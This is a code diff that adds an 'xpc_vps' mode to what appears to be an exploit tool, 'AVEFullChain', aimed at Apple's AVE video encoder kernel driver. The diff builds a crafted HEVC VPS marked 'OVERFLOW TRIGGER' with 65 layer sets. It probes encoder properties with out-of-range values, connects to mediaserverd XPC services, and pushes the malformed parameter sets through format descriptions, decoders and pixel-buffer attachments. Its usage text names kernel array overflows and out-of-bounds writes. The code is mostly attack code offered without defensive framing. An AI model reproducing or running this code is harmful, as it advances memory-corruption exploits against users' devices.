@@ -44,6 +44,8 @@
 #include <CoreVideo/CoreVideo.h>
 #include <CoreMedia/CoreMedia.h>
 #include <IOKit/IOKitLib.h>
+#include <xpc/xpc.h>
+#import <Foundation/Foundation.h>
 
 #ifndef kIOMasterPortDefault
 #define kIOMasterPortDefault ((mach_port_t)0)
@@ -246,6 +248,167 @@ static VTCompressionSessionRef create_mvhevc_encoder(int w, int h, int layer_id)
         return NULL;
     }
     return session;
+}
+
+/* ---- Bitstream writer for HEVC NAL construction ---- */
+
+typedef struct { uint8_t *buf; size_t cap; size_t byte_pos; int bits_left; } bitwriter_t;
+
+static void bw_init(bitwriter_t *w, uint8_t *buf, size_t cap) {
+    w->buf = buf; w->cap = cap; w->byte_pos = 0; w->bits_left = 8;
+    memset(buf, 0, cap);
+}
+
+static void bw_put_bits(bitwriter_t *w, uint32_t val, int n) {
+    for (int i = n - 1; i >= 0; i--) {
+        if (w->byte_pos >= w->cap) return;
+        w->buf[w->byte_pos] |= ((val >> i) & 1) << (--w->bits_left);
+        if (w->bits_left == 0) { w->byte_pos++; w->bits_left = 8; }
+    }
+}
+
+static void bw_put_ue(bitwriter_t *w, uint32_t val) {
+    uint32_t v = val + 1;
+    int len = 0; for (uint32_t t = v; t; t >>= 1) len++;
+    for (int i = 0; i < len - 1; i++) bw_put_bits(w, 0, 1);
+    bw_put_bits(w, v, len);
+}
+
+static size_t bw_finish(bitwriter_t *w) {
+    if (w->bits_left < 8) {
+        w->buf[w->byte_pos] |= (1 << (--w->bits_left));
+        w->byte_pos++;
+    }
+    return w->byte_pos;
+}
+
+static size_t build_crafted_vps(uint8_t *buf, size_t buf_sz, int num_layer_sets) {
+    if (!buf || buf_sz < 64 || num_layer_sets < 1) return 0;
+    buf[0] = 0x40; buf[1] = 0x01;
+
+    bitwriter_t w;
+    bw_init(&w, buf + 2, buf_sz - 2);
+
+    bw_put_bits(&w, 0, 4);  /* vps_video_parameter_set_id */
+    bw_put_bits(&w, 1, 1);  /* vps_base_layer_internal_flag */
+    bw_put_bits(&w, 1, 1);  /* vps_base_layer_available_flag */
+    bw_put_bits(&w, 0, 6);  /* vps_max_layers_minus1 */
+    bw_put_bits(&w, 0, 3);  /* vps_max_sub_layers_minus1 */
+    bw_put_bits(&w, 1, 1);  /* vps_temporal_id_nesting_flag */
+    bw_put_bits(&w, 0xFFFF, 16);
+
+    /* profile_tier_level: Main profile, level 4.0 */
+    bw_put_bits(&w, 0, 2); bw_put_bits(&w, 0, 1); bw_put_bits(&w, 1, 5);
+    bw_put_bits(&w, 0x40000000, 32);
+    bw_put_bits(&w, 0, 16); bw_put_bits(&w, 0, 16); bw_put_bits(&w, 0, 16);
+    bw_put_bits(&w, 120, 8);
+
+    bw_put_bits(&w, 0, 1);  /* sub_layer_ordering_info_present_flag */
+    bw_put_ue(&w, 1);  bw_put_ue(&w, 0);  bw_put_ue(&w, 0);
+
+    bw_put_bits(&w, 63, 6);  /* vps_max_layer_id = 63 */
+    bw_put_ue(&w, (uint32_t)(num_layer_sets - 1)); /* OVERFLOW TRIGGER */
+
+    for (int i = 1; i < num_layer_sets; i++) {
+        bw_put_bits(&w, 1, 1);
+        for (int j = 1; j <= 63; j++) bw_put_bits(&w, 0, 1);
+        if (w.byte_pos + 2 >= w.cap) break;
+    }
+
+    bw_put_bits(&w, 0, 1);  /* vps_timing_info_present_flag */
+    bw_put_bits(&w, 1, 1);  /* vps_extension_flag = 1 */
+    for (int i = 0; i < 64 && w.byte_pos + 2 < w.cap; i++)
+        bw_put_bits(&w, 0, 8);
+
+    size_t body = bw_finish(&w);
+    return 2 + body;
+}
+
+/* Build minimal SPS NAL for HEVC decoder */
+static size_t build_minimal_sps(uint8_t *buf, size_t buf_sz) {
+    if (!buf || buf_sz < 32) return 0;
+    buf[0] = 0x42; buf[1] = 0x01; /* nal_unit_type=33 (SPS) */
+
+    bitwriter_t w;
+    bw_init(&w, buf + 2, buf_sz - 2);
+
+    bw_put_bits(&w, 0, 4);  /* sps_video_parameter_set_id */
+    bw_put_bits(&w, 0, 3);  /* sps_max_sub_layers_minus1 */
+    bw_put_bits(&w, 1, 1);  /* sps_temporal_id_nesting_flag */
+
+    /* profile_tier_level */
+    bw_put_bits(&w, 0, 2); bw_put_bits(&w, 0, 1); bw_put_bits(&w, 1, 5);
+    bw_put_bits(&w, 0x40000000, 32);
+    bw_put_bits(&w, 0, 16); bw_put_bits(&w, 0, 16); bw_put_bits(&w, 0, 16);
+    bw_put_bits(&w, 120, 8);
+
+    bw_put_ue(&w, 0);  /* sps_seq_parameter_set_id */
+    bw_put_ue(&w, 0);  /* chroma_format_idc = 0 (monochrome) */
+    bw_put_ue(&w, 128); /* pic_width_in_luma_samples */
+    bw_put_ue(&w, 128); /* pic_height_in_luma_samples */
+    bw_put_bits(&w, 0, 1); /* conformance_window_flag */
+    bw_put_ue(&w, 0);  /* bit_depth_luma_minus8 */
+    bw_put_ue(&w, 0);  /* bit_depth_chroma_minus8 */
+    bw_put_ue(&w, 4);  /* log2_max_pic_order_cnt_lsb_minus4 */
+    bw_put_bits(&w, 0, 1); /* sub_layer_ordering_info_present_flag */
+    bw_put_ue(&w, 1); bw_put_ue(&w, 0); bw_put_ue(&w, 0);
+    bw_put_ue(&w, 0);  /* log2_min_luma_coding_block_size_minus3 */
+    bw_put_ue(&w, 0);  /* log2_diff_max_min_luma_coding_block_size */
+    bw_put_ue(&w, 0);  /* log2_min_luma_transform_block_size_minus2 */
+    bw_put_ue(&w, 0);  /* log2_diff_max_min_luma_transform_block_size */
+    bw_put_ue(&w, 0);  /* max_transform_hierarchy_depth_inter */
+    bw_put_ue(&w, 0);  /* max_transform_hierarchy_depth_intra */
+    bw_put_bits(&w, 0, 1); /* scaling_list_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* amp_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* sample_adaptive_offset_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* pcm_enabled_flag */
+    bw_put_ue(&w, 0);  /* num_short_term_ref_pic_sets */
+    bw_put_bits(&w, 0, 1); /* long_term_ref_pics_present_flag */
+    bw_put_bits(&w, 0, 1); /* sps_temporal_mvp_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* strong_intra_smoothing_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* vui_parameters_present_flag */
+    bw_put_bits(&w, 0, 1); /* sps_extension_present_flag */
+
+    size_t body = bw_finish(&w);
+    return 2 + body;
+}
+
+/* Build minimal PPS NAL */
+static size_t build_minimal_pps(uint8_t *buf, size_t buf_sz) {
+    if (!buf || buf_sz < 16) return 0;
+    buf[0] = 0x44; buf[1] = 0x01; /* nal_unit_type=34 (PPS) */
+
+    bitwriter_t w;
+    bw_init(&w, buf + 2, buf_sz - 2);
+
+    bw_put_ue(&w, 0);  /* pps_pic_parameter_set_id */
+    bw_put_ue(&w, 0);  /* pps_seq_parameter_set_id */
+    bw_put_bits(&w, 0, 1); /* dependent_slice_segments_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* output_flag_present_flag */
+    bw_put_bits(&w, 0, 3); /* num_extra_slice_header_bits */
+    bw_put_bits(&w, 0, 1); /* sign_data_hiding_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* cabac_init_present_flag */
+    bw_put_ue(&w, 0); bw_put_ue(&w, 0);
+    bw_put_ue(&w, 0);  /* init_qp_minus26 (se, but 0 is same) */
+    bw_put_bits(&w, 0, 1); /* constrained_intra_pred_flag */
+    bw_put_bits(&w, 0, 1); /* transform_skip_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* cu_qp_delta_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* pps_slice_chroma_qp_offsets_present_flag */
+    bw_put_bits(&w, 0, 1); /* weighted_pred_flag */
+    bw_put_bits(&w, 0, 1); /* weighted_bipred_flag */
+    bw_put_bits(&w, 0, 1); /* transquant_bypass_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* tiles_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* entropy_coding_sync_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* pps_loop_filter_across_slices_enabled_flag */
+    bw_put_bits(&w, 0, 1); /* deblocking_filter_control_present_flag */
+    bw_put_bits(&w, 0, 1); /* pps_scaling_list_data_present_flag */
+    bw_put_bits(&w, 0, 1); /* lists_modification_present_flag */
+    bw_put_ue(&w, 0);  /* log2_parallel_merge_level_minus2 */
+    bw_put_bits(&w, 0, 1); /* slice_segment_header_extension_present_flag */
+    bw_put_bits(&w, 0, 1); /* pps_extension_present_flag */
+
+    size_t body = bw_finish(&w);
+    return 2 + body;
 }
 
 static int encode_one(VTCompressionSessionRef session, int frame_idx, int w, int h) {
@@ -4426,6 +4589,385 @@ cleanup_dummies:
 
         rlog("Found %d AVE/video-related services\n", found_count);
 
+    } else if (strcmp(mode, "xpc_vps") == 0) {
+        /*
+         * xpc_vps — Attempt to reach mediaserverd's compression XPC service
+         * and influence VPS struct fields that get forwarded to kernel sAddClient.
+         *
+         * Strategy: VideoToolbox caps layers at 2, but the sHEVC_VPS struct
+         * has fields (vps_num_layer_sets_minus1, num_add_layer_sets, etc.)
+         * that are populated separately from iLayerNum. We test whether
+         * setting encoder properties can influence these unvalidated fields.
+         */
+        int phase = 1;
+        if (argc > 2) phase = atoi(argv[2]);
+
+        rlog("=== XPC VPS Field Manipulation Test (phase %d) ===\n\n", phase);
+
+        if (phase == 1) {
+            rlog("--- Phase 1: VPS-influencing property scan ---\n");
+            rlog("Testing all HEVC encoder properties that may influence VPS fields\n\n");
+
+            /* Create HEVC encoder session */
+            VTCompressionSessionRef session = NULL;
+            OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
+                kCMVideoCodecType_HEVC, NULL, NULL, NULL,
+                NULL, NULL, &session);
+            if (st != 0 || !session) {
+                rlog("FAIL: create session: %d\n", (int)st);
+                goto done;
+            }
+            rlog("Session created OK\n");
+
+            /* Properties that might influence VPS extension fields */
+            struct {
+                const char *name;
+                CFStringRef key;
+                int test_val;
+            } vps_props[] = {
+                {"MaxLayerCount", CFSTR("MaxLayerCount"), 65},
+                {"NumberOfLayers", CFSTR("NumberOfLayers"), 65},
+                {"NumLayerSets", CFSTR("NumLayerSets"), 65},
+                {"VPSNumLayerSets", CFSTR("VPSNumLayerSets"), 128},
+                {"MaxSubLayers", CFSTR("MaxSubLayers"), 7},
+                {"HEVCMaxSubLayers", CFSTR("HEVCMaxSubLayers"), 7},
+                {"NumAddLayerSets", CFSTR("NumAddLayerSets"), 65},
+                {"VPSExtension", CFSTR("VPSExtension"), 1},
+                {"MultiLayerHEVC", CFSTR("MultiLayerHEVC"), 1},
+                {"LayerSetCount", CFSTR("LayerSetCount"), 128},
+                {"MaxLayers", CFSTR("MaxLayers"), 65},
+                {"NumOutputLayerSets", CFSTR("NumOutputLayerSets"), 65},
+                {"HEVCLayerCount", CFSTR("HEVCLayerCount"), 65},
+            };
+            int nprop = sizeof(vps_props) / sizeof(vps_props[0]);
+
+            for (int i = 0; i < nprop; i++) {
+                CFNumberRef val = CFNumberCreate(NULL, kCFNumberIntType,
+                    &vps_props[i].test_val);
+                st = VTSessionSetProperty(session,
+                    vps_props[i].key, val);
+                rlog("  %-30s = %3d → %s (%d)\n",
+                    vps_props[i].name, vps_props[i].test_val,
+                    st == 0 ? "ACCEPTED" : "rejected", (int)st);
+                CFRelease(val);
+            }
+
+            /* Try SampleAttachedVPS via raw data property */
+            rlog("\n--- Trying raw VPS data injection via properties ---\n");
+
+            uint8_t crafted[8192];
+            size_t vps_len = build_crafted_vps(crafted, sizeof(crafted), 65);
+            rlog("Built crafted VPS: %zu bytes, 65 layer sets\n", vps_len);
+
+            CFDataRef vps_data = CFDataCreate(NULL, crafted, (CFIndex)vps_len);
+            const char *data_keys[] = {
+                "SampleAttachedVPS",
+                "VideoParameterSet",
+                "HEVCVideoParameterSet",
+                "RawVPS",
+                "VPSData",
+                "ParameterSetData",
+            };
+            for (int i = 0; i < 6; i++) {
+                st = VTSessionSetProperty(session,
+                    CFStringCreateWithCString(NULL, data_keys[i],
+                        kCFStringEncodingUTF8), vps_data);
+                rlog("  %-30s data(%zu) → %s (%d)\n",
+                    data_keys[i], vps_len,
+                    st == 0 ? "ACCEPTED" : "rejected", (int)st);
+            }
+            CFRelease(vps_data);
+
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+        }
+
+        if (phase == 2) {
+            rlog("--- Phase 2: Direct XPC connection to mediaserverd ---\n");
+
+            /* Try to connect to the compression session XPC service */
+            xpc_connection_t conn = xpc_connection_create_mach_service(
+                "com.apple.coremedia.videocodecd.compressionsession",
+                NULL, 0);
+
+            if (!conn) {
+                rlog("FAIL: xpc_connection_create returned NULL\n");
+
+                /* Try alternative service names */
+                const char *alt_services[] = {
+                    "com.apple.coremedia.videocodecd",
+                    "com.apple.videocodecd",
+                    "com.apple.mediaserverd",
+                    "com.apple.coremedia.compressionsession",
+                    "com.apple.avfoundation.compressionsession",
+                    NULL
+                };
+                for (int i = 0; alt_services[i]; i++) {
+                    conn = xpc_connection_create_mach_service(
+                        alt_services[i], NULL, 0);
+                    rlog("  Try %s: %s\n", alt_services[i],
+                        conn ? "connected" : "NULL");
+                    if (conn) {
+                        rlog("  Found alternative service!\n");
+                        break;
+                    }
+                }
+            } else {
+                rlog("XPC connection created to compressionsession service\n");
+            }
+
+            if (conn) {
+                xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
+                    xpc_type_t t = xpc_get_type(event);
+                    if (t == XPC_TYPE_ERROR) {
+                        const char *desc = xpc_copy_description(event);
+                        rlog("XPC event: %s\n", desc);
+                    }
+                });
+                xpc_connection_resume(conn);
+
+                /* Send a probe message to discover the protocol */
+                xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+                xpc_dictionary_set_string(msg, "operation", "createSession");
+                xpc_dictionary_set_int64(msg, "codecType", 'hvc1');
+                xpc_dictionary_set_int64(msg, "width", 128);
+                xpc_dictionary_set_int64(msg, "height", 128);
+
+                rlog("Sending probe message...\n");
+                xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
+                    conn, msg);
+                if (reply) {
+                    const char *desc = xpc_copy_description(reply);
+                    rlog("Reply: %.500s\n", desc ? desc : "(null)");
+                }
+
+                xpc_release(msg);
+                xpc_connection_cancel(conn);
+            }
+        }
+
+        if (phase == 3) {
+            rlog("--- Phase 3: Encode with crafted SPS/PPS injection ---\n");
+            rlog("Attempting to inject crafted parameter sets via CMSampleBuffer\n\n");
+
+            VTCompressionSessionRef session = NULL;
+            OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
+                kCMVideoCodecType_HEVC, NULL, NULL, NULL,
+                NULL, NULL, &session);
+            if (st != 0 || !session) {
+                rlog("FAIL: create session: %d\n", (int)st);
+                goto done;
+            }
+
+            /* Set MV-HEVC with 2 layers (max allowed) */
+            int layers[] = {0, 1};
+            CFMutableArrayRef layerArr = CFArrayCreateMutable(NULL, 2,
+                &kCFTypeArrayCallBacks);
+            for (int i = 0; i < 2; i++) {
+                CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &layers[i]);
+                CFArrayAppendValue(layerArr, n);
+                CFRelease(n);
+            }
+            st = VTSessionSetProperty(session,
+                CFSTR("MVHEVCVideoLayerIDs"), layerArr);
+            CFRelease(layerArr);
+            rlog("MVHEVCVideoLayerIDs [0,1]: %d\n", (int)st);
+
+            int left = 0, right = 1;
+            CFMutableArrayRef viewArr = CFArrayCreateMutable(NULL, 2,
+                &kCFTypeArrayCallBacks);
+            CFNumberRef ln = CFNumberCreate(NULL, kCFNumberIntType, &left);
+            CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &right);
+            CFArrayAppendValue(viewArr, ln);
+            CFArrayAppendValue(viewArr, rn);
+            st = VTSessionSetProperty(session,
+                CFSTR("MVHEVCViewIDs"), viewArr);
+            CFRelease(viewArr); CFRelease(ln); CFRelease(rn);
+            rlog("MVHEVCViewIDs [0,1]: %d\n", (int)st);
+
+            st = VTCompressionSessionPrepareToEncodeFrames(session);
+            rlog("PrepareToEncodeFrames: %d\n", (int)st);
+
+            /* Build crafted VPS with 65 layer sets */
+            uint8_t vps_nal[8192];
+            size_t vps_len = build_crafted_vps(vps_nal, sizeof(vps_nal), 65);
+            rlog("Crafted VPS NAL: %zu bytes\n", vps_len);
+
+            /* Build minimal SPS and PPS */
+            uint8_t sps_nal[256];
+            size_t sps_len = build_minimal_sps(sps_nal, sizeof(sps_nal));
+            rlog("Minimal SPS NAL: %zu bytes\n", sps_len);
+
+            uint8_t pps_nal[128];
+            size_t pps_len = build_minimal_pps(pps_nal, sizeof(pps_nal));
+            rlog("Minimal PPS NAL: %zu bytes\n", pps_len);
+
+            /* Create format description with crafted parameter sets */
+            const uint8_t *psets[] = { vps_nal, sps_nal, pps_nal };
+            size_t psizes[] = { vps_len, sps_len, pps_len };
+
+            CMFormatDescriptionRef fmt = NULL;
+            st = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
+                NULL, 3, psets, psizes, 4, NULL, &fmt);
+            rlog("CreateFromHEVCParameterSets (65 layer sets): %s (%d)\n",
+                st == 0 ? "SUCCESS" : "FAIL", (int)st);
+
+            if (st == 0 && fmt) {
+                rlog("Format description created with crafted VPS!\n");
+
+                /* Create a CMSampleBuffer with this format and try to decode */
+                /* First create a minimal IDR slice NAL */
+                uint8_t idr[] = {
+                    0x00, 0x00, 0x00, 0x04,
+                    0x26, 0x01, 0xAF, 0x09
+                };
+
+                CMBlockBufferRef block = NULL;
+                st = CMBlockBufferCreateWithMemoryBlock(NULL,
+                    idr, sizeof(idr), NULL, NULL, 0, sizeof(idr), 0, &block);
+                rlog("CMBlockBuffer: %d\n", (int)st);
+
+                if (st == 0 && block) {
+                    CMSampleBufferRef sample = NULL;
+                    CMSampleTimingInfo timing = {
+                        .duration = CMTimeMake(1, 30),
+                        .presentationTimeStamp = CMTimeMake(0, 30),
+                        .decodeTimeStamp = kCMTimeInvalid
+                    };
+                    size_t ssize = sizeof(idr);
+                    st = CMSampleBufferCreate(NULL, block, true, NULL, NULL,
+                        fmt, 1, 1, &timing, 1, &ssize, &sample);
+                    rlog("CMSampleBuffer with crafted fmt: %d\n", (int)st);
+
+                    if (st == 0 && sample) {
+                        rlog("SUCCESS: Created sample with 65-layer-set VPS!\n");
+
+                        /* Try to create VTDecompressionSession with this format */
+                        VTDecompressionSessionRef decomp = NULL;
+                        VTDecompressionOutputCallbackRecord cb = {NULL, NULL};
+                        st = VTDecompressionSessionCreate(NULL, fmt,
+                            NULL, NULL, &cb, &decomp);
+                        rlog("VTDecompressionSession with crafted fmt: %s (%d)\n",
+                            st == 0 ? "SUCCESS" : "FAIL", (int)st);
+
+                        if (st == 0 && decomp) {
+                            rlog("CRITICAL: Decoder accepted crafted VPS!\n");
+                            rlog("Attempting to decode frame...\n");
+
+                            VTDecodeFrameFlags flags = 0;
+                            VTDecodeInfoFlags info = 0;
+                            st = VTDecompressionSessionDecodeFrame(decomp,
+                                sample, flags, NULL, &info);
+                            rlog("DecodeFrame: %d (info=0x%x)\n",
+                                (int)st, (unsigned)info);
+
+                            VTDecompressionSessionInvalidate(decomp);
+                            CFRelease(decomp);
+                        }
+
+                        CFRelease(sample);
+                    }
+                    CFRelease(block);
+                }
+                CFRelease(fmt);
+            }
+
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+        }
+
+        if (phase >= 4) {
+            rlog("--- Phase 4: Format description re-injection into encoder ---\n");
+            rlog("Testing if encoder accepts frames with crafted format descriptions\n\n");
+
+            /* Build crafted VPS with overflow count */
+            uint8_t vps_nal[8192];
+            size_t vps_len = build_crafted_vps(vps_nal, sizeof(vps_nal), 65);
+
+            uint8_t sps_nal[256];
+            size_t sps_len = build_minimal_sps(sps_nal, sizeof(sps_nal));
+
+            uint8_t pps_nal[128];
+            size_t pps_len = build_minimal_pps(pps_nal, sizeof(pps_nal));
+
+            /* Create format description with crafted parameter sets */
+            const uint8_t *psets[] = { vps_nal, sps_nal, pps_nal };
+            size_t psizes[] = { vps_len, sps_len, pps_len };
+
+            CMFormatDescriptionRef crafted_fmt = NULL;
+            OSStatus st = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
+                NULL, 3, psets, psizes, 4, NULL, &crafted_fmt);
+            rlog("Crafted format (65 layer sets): %s (%d)\n",
+                st == 0 ? "OK" : "FAIL", (int)st);
+
+            if (st != 0 || !crafted_fmt) {
+                rlog("Cannot create crafted format\n");
+                goto done;
+            }
+
+            /* Create encoder session */
+            VTCompressionSessionRef session = NULL;
+            st = VTCompressionSessionCreate(NULL, 128, 128,
+                kCMVideoCodecType_HEVC, NULL, NULL, NULL,
+                NULL, NULL, &session);
+            if (st != 0) {
+                rlog("Session create: %d\n", (int)st);
+                CFRelease(crafted_fmt);
+                goto done;
+            }
+
+            st = VTCompressionSessionPrepareToEncodeFrames(session);
+            rlog("Prepare: %d\n", (int)st);
+
+            /* Create pixel buffer and tag it with our crafted format */
+            CVPixelBufferRef pb = NULL;
+            NSDictionary *pba = @{
+                (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
+                (id)kCVPixelBufferWidthKey: @128,
+                (id)kCVPixelBufferHeightKey: @128,
+            };
+            CVReturn cvr = CVPixelBufferCreate(NULL, 128, 128,
+                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
+                (__bridge CFDictionaryRef)pba, &pb);
+
+            if (cvr != 0 || !pb) {
+                rlog("PixelBuffer create: %d\n", (int)cvr);
+            } else {
+                /* Attach crafted format description as an attachment */
+                CVBufferSetAttachment(pb,
+                    CFSTR("FormatDescription"), crafted_fmt,
+                    kCVAttachmentMode_ShouldPropagate);
+
+                /* Also try attaching raw VPS data */
+                CFDataRef vps_data = CFDataCreate(NULL, vps_nal, (CFIndex)vps_len);
+                CVBufferSetAttachment(pb,
+                    CFSTR("HEVCVideoParameterSet"), vps_data,
+                    kCVAttachmentMode_ShouldPropagate);
+                CFRelease(vps_data);
+
+                rlog("Attached crafted format + VPS to pixel buffer\n");
+
+                /* Encode the tagged pixel buffer */
+                CMTime pts = CMTimeMake(0, 30);
+                CFDictionaryRef frame_props = (__bridge CFDictionaryRef)@{
+                    (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @YES
+                };
+                st = VTCompressionSessionEncodeFrame(session, pb,
+                    pts, kCMTimeInvalid, frame_props, NULL, NULL);
+                rlog("EncodeFrame with crafted attachments: %d\n", (int)st);
+
+                /* Flush and check */
+                st = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+                rlog("CompleteFrames: %d\n", (int)st);
+
+                CVPixelBufferRelease(pb);
+            }
+
+            CFRelease(crafted_fmt);
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+        }
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -4465,6 +5007,7 @@ cleanup_dummies:
         rlog("  vps_overflow       -- KEY: Set >64 MV-HEVC layers to overflow kernel VPS arrays\n");
         rlog("  iokit_vps [phase]  -- Direct IOKit probe: enumerate AVE service + craft VPS\n");
         rlog("  iokit_enum         -- Enumerate all IOKit video encoder services\n");
+        rlog("  xpc_vps [phase]    -- KEY: XPC VPS field manipulation + crafted format injection\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
